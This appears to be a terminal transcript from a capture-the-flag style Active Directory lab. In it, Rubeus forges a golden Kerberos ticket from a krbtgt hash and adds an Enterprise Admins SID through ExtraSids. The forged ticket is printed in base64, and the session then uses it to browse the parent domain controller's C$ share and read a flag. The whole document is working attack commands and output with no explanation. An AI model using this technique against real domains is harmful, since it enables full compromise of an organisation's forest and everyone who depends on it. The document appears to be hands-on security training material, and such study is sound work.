
```
PS C:\tools> .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.0.2

[*] Action: Build TGT

[*] Building PAC

[*] Domain         : LOGISTICS.INLANEFREIGHT.LOCAL (LOGISTICS)
[*] SID            : S-1-5-21-2806153819-209893948-922872689
[*] UserId         : 500
[*] Groups         : 520,512,513,519,518
[*] ExtraSIDs      : S-1-5-21-3842939050-3880317879-2865463114-519
[*] ServiceKey     : 9D765B482771505CBE97411065964D5F
[*] ServiceKeyType : KERB_CHECKSUM_HMAC_MD5
[*] KDCKey         : 9D765B482771505CBE97411065964D5F
[*] KDCKeyType     : KERB_CHECKSUM_HMAC_MD5
[*] Service        : krbtgt
[*] Target         : LOGISTICS.INLANEFREIGHT.LOCAL

[*] Generating EncTicketPart
[*] Signing PAC
[*] Encrypting EncTicketPart
[*] Generating Ticket
[*] Generated KERB-CRED
[*] Forged a TGT for 'hacker@LOGISTICS.INLANEFREIGHT.LOCAL'

[*] AuthTime       : 8/11/2026 9:46:05 PM
[*] StartTime      : 8/11/2026 9:46:05 PM
[*] EndTime        : 8/12/2026 7:46:05 AM
[*] RenewTill      : 8/18/2026 9:46:05 PM

[*] base64(ticket.kirbi):

      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


[+] Ticket successfully imported!
PS C:\tools> klist

Current LogonId is 0:0x8507c

Cached Tickets: (1)

```


```

PS C:\tools\mimikatz\x64> cd \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids
PS Microsoft.PowerShell.Core\FileSystem::\\academy-ea-dc01.inlanefreight.local\c$\ExtraSids> ls


    Directory: \\academy-ea-dc01.inlanefreight.local\c$\ExtraSids


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         4/7/2022   2:31 PM             21 flag.txt


PS Microsoft.PowerShell.Core\FileSystem::\\academy-ea-dc01.inlanefreight.local\c$\ExtraSids> cat flag.txt
f@ll1ng_l1k3_d0m1no3$
PS Microsoft.PowerShell.Core\FileSystem::\\academy-ea-dc01.inlanefreight.local\c$\ExtraSids>
```